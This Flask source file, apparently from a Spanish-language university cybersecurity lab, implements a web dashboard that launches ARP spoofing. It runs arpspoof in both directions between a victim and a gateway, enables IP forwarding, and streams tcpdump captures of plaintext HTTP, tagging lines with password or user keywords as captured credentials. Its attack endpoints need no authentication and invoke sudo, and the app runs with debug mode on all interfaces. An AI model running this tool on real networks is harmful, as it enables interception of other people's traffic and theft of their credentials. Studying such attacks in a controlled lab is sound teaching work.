#!/usr/bin/env python3
"""
Equipo 3: Servidor Web de Monitoreo y Control ARP Spoofing
Laboratorio de Ciberseguridad
"""

import os
import sys
import time
import subprocess
import threading
import re
import signal
from datetime import datetime
from flask import Flask, render_template, jsonify, request, send_from_directory

app = Flask(__name__, template_folder='templates', static_folder='static')

# Estado global de la aplicación (Thread-safe)
class AttackState:
    def __init__(self):
        self.running = False
        self.interface = None
        self.target_ip = None
        self.gateway_ip = None
        self.processes = []
        self.logs = []
        self.logs_lock = threading.Lock()
        self.start_time = None
        self.statistics = {
            "total_requests": 0,
            "total_credentials": 0,
            "total_packets": 0
        }
        
    def reset_stats(self):
        self.statistics = {
            "total_requests": 0,
            "total_credentials": 0,
            "total_packets": 0
        }
        with self.logs_lock:
            self.logs = []
        self.start_time = None

state = AttackState()

def get_interfaces():
    """Detecta las interfaces de red disponibles en el sistema"""
    try:
        result = subprocess.run(["ip", "link", "show"], 
                              capture_output=True, text=True, check=True)
        interfaces = re.findall(r'\d+: (\w+):', result.stdout)
        # Excluir 'lo' (loopback)
        return [iface for iface in interfaces if iface != "lo"]
    except Exception as e:
        print(f"[!] Error al listar interfaces: {e}")
        return []

def validate_ip(ip):
    """Valida formato de IP"""
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        return all(0 <= int(part) <= 255 for part in parts)
    return False

def enable_ip_forwarding(enable=True):
    """Habilita o deshabilita el reenvío de IP (IP forwarding)"""
    val = "1" if enable else "0"
    print(f"[*] Configurando net.ipv4.ip_forward = {val}...")
    try:
        subprocess.run(["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={val}"], 
                     check=True, capture_output=True)
        return True
    except Exception as e:
        print(f"[✗] Error al configurar IP forwarding: {e}")
        return False

def check_ip_forwarding():
    """Verifica si el reenvío de IP está habilitado en el sistema"""
    try:
        result = subprocess.run(["sysctl", "net.ipv4.ip_forward"], 
                              capture_output=True, text=True)
        if "net.ipv4.ip_forward = 1" in result.stdout:
            return True
    except:
        pass
    return False

def read_tcpdump_output(process):
    """Lee y procesa la salida de tcpdump en tiempo real en un hilo separado"""
    print("[*] Hilo lector de tcpdump iniciado")
    
    for line in process.stdout:
        # Si el ataque se detuvo, salir del bucle
        if not state.running:
            break
            
        line_str = line.strip()
        if not line_str:
            continue
            
        # Incrementar contador de paquetes
        state.statistics["total_packets"] += 1
        
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        log_type = "general"
        
        lower_line = line_str.lower()
        
        # Clasificar según el contenido
        if "get " in lower_line or "post " in lower_line or "host:" in lower_line:
            if "get " in lower_line:
                log_type = "get"
            elif "post " in lower_line:
                log_type = "post"
            else:
                log_type = "request_info"
            state.statistics["total_requests"] += 1
            
        elif "200 ok" in lower_line or "404" in lower_line or "302" in lower_line or "http/1." in lower_line:
            log_type = "response"
            
        elif any(kw in lower_line for kw in ["password", "pass", "user", "usuario", "contraseña", "passwd"]):
            log_type = "credential"
            state.statistics["total_credentials"] += 1
            
        else:
            # Omitir líneas demasiado cortas o ruido innecesario
            if len(line_str) < 8:
                continue
            # Limitar el tamaño de líneas generales muy largas para no saturar la UI
            if len(line_str) > 250:
                line_str = line_str[:250] + "..."
                
        # Agregar a los logs en memoria
        with state.logs_lock:
            log_entry = {
                "id": len(state.logs),
                "timestamp": timestamp,
                "type": log_type,
                "message": line_str
            }
            state.logs.append(log_entry)
            
            # Limitar memoria (mantener últimos 2000 logs)
            if len(state.logs) > 2000:
                state.logs.pop(0)

    print("[*] Hilo lector de tcpdump finalizado")

def cleanup_processes():
    """Detiene los subprocesos y limpia la configuración de red"""
    print("[*] Deteniendo subprocesos del ataque...")
    
    # Detener procesos arpspoof y tcpdump
    for proc in state.processes:
        try:
            if proc and proc.poll() is None:
                proc.terminate()
                time.sleep(0.2)
                if proc.poll() is None:
                    proc.kill()
        except Exception as e:
            print(f"[!] Error al terminar proceso: {e}")
            
    state.processes = []
    
    # Restaurar IP Forwarding a 0
    enable_ip_forwarding(False)
    
    state.running = False
    print("[✓] Limpieza del sistema finalizada.")

# --- Endpoints de la Aplicación ---

@app.route('/')
def index():
    """Carga la interfaz gráfica del panel"""
    # Verificar si corre como root
    is_root = (os.geteuid() == 0)
    return render_template('index.html', is_root=is_root)

@app.route('/api/interfaces', methods=['GET'])
def api_interfaces():
    """Retorna las interfaces de red disponibles"""
    interfaces = get_interfaces()
    return jsonify({
        "interfaces": interfaces,
        "recommended": interfaces[0] if interfaces else None
    })

@app.route('/api/status', methods=['GET'])
def api_status():
    """Obtiene el estado actual del ataque y estadísticas"""
    duration = 0
    if state.running and state.start_time:
        duration = int(time.time() - state.start_time)
        
    return jsonify({
        "running": state.running,
        "interface": state.interface,
        "target_ip": state.target_ip,
        "gateway_ip": state.gateway_ip,
        "ip_forwarding": check_ip_forwarding(),
        "duration_seconds": duration,
        "statistics": state.statistics
    })

@app.route('/api/logs', methods=['GET'])
def api_logs():
    """Retorna los logs generados desde una posición específica (polling)"""
    since_id = request.args.get('since', default=0, type=int)
    
    with state.logs_lock:
        new_logs = [log for log in state.logs if log['id'] > since_id]
        
    return jsonify({
        "logs": new_logs,
        "last_id": state.logs[-1]['id'] if state.logs else 0
    })

@app.route('/api/attack/start', methods=['POST'])
def api_attack_start():
    """Inicia el ataque de envenenamiento ARP y monitoreo"""
    if state.running:
        return jsonify({"success": False, "error": "El ataque ya está en ejecución."}), 400
        
    data = request.json or {}
    interface = data.get("interface", "").strip()
    target_ip = data.get("target_ip", "").strip()
    gateway_ip = data.get("gateway_ip", "").strip()
    
    if not interface or not target_ip or not gateway_ip:
        return jsonify({"success": False, "error": "Faltan parámetros requeridos (interfaz, IP víctima, IP gateway)."}), 400
        
    if not validate_ip(target_ip):
        return jsonify({"success": False, "error": "IP de la víctima (Equipo 1) no es válida."}), 400
        
    if not validate_ip(gateway_ip):
        return jsonify({"success": False, "error": "IP del servidor (Equipo 2) no es válida."}), 400
        
    # Reiniciar estado y estadísticas
    state.reset_stats()
    state.interface = interface
    state.target_ip = target_ip
    state.gateway_ip = gateway_ip
    
    # 1. Habilitar IP Forwarding
    if not enable_ip_forwarding(True):
        return jsonify({"success": False, "error": "No se pudo habilitar IP Forwarding. ¿Inició la app con 'sudo'?"}), 500
        
    # 2. Iniciar comandos de ARP Spoofing
    cmd1 = ["sudo", "arpspoof", "-i", interface, "-t", target_ip, gateway_ip]
    cmd2 = ["sudo", "arpspoof", "-i", interface, "-t", gateway_ip, target_ip]
    
    # 3. Iniciar comando tcpdump (HTTP port 80 en texto plano)
    # Usamos -l para forzar salida con buffer de línea
    cmd_tcpdump = ["sudo", "tcpdump", "-i", interface, "-A", "port 80", "-l"]
    
    try:
        # Ejecutar arpspoof en ambas direcciones (silenciosos)
        proc1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        proc2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Ejecutar tcpdump capturando salida estándar por PIPE
        proc_tcpdump = subprocess.Popen(cmd_tcpdump, stdout=subprocess.PIPE, 
                                        stderr=subprocess.DEVNULL, text=True, bufsize=1)
        
        state.processes = [proc1, proc2, proc_tcpdump]
        state.running = True
        state.start_time = time.time()
        
        # 4. Iniciar hilo de lectura de la salida de tcpdump
        thread = threading.Thread(target=read_tcpdump_output, args=(proc_tcpdump,), daemon=True)
        thread.start()
        
        print(f"[✓] Ataque iniciado correctamente. Interfaz: {interface} | Víctima: {target_ip} | Servidor: {gateway_ip}")
        return jsonify({"success": True})
        
    except FileNotFoundError as e:
        cleanup_processes()
        return jsonify({
            "success": False, 
            "error": "Herramientas de red faltantes. Instala dsniff y tcpdump (sudo apt install dsniff tcpdump)"
        }), 500
    except Exception as e:
        cleanup_processes()
        return jsonify({"success": False, "error": f"Error inesperado al iniciar ataque: {str(e)}"}), 500

@app.route('/api/attack/stop', methods=['POST'])
def api_attack_stop():
    """Detiene el ataque y restaura las configuraciones del host"""
    if not state.running:
        return jsonify({"success": False, "error": "El ataque no está en ejecución."}), 400
        
    cleanup_processes()
    return jsonify({"success": True})

@app.route('/api/flush-arp', methods=['POST'])
def api_flush_arp():
    """Limpia las tablas ARP del sistema atacante"""
    try:
        subprocess.run(["sudo", "ip", "-s", "-s", "neigh", "flush", "all"], 
                     capture_output=True, check=True)
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": f"Error al limpiar tabla ARP: {str(e)}"}), 500

# Capturar señales para garantizar la desconexión del ataque al apagar la app
def signal_handler(sig, frame):
    print("\n[!] Apagando servidor Flask de forma segura...")
    cleanup_processes()
    sys.exit(0)

if __name__ == '__main__':
    # Registrar señales de detención
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Levantar el servidor en puerto 8080 en todas las interfaces para accesibilidad
    app.run(host='0.0.0.0', port=8080, debug=True)
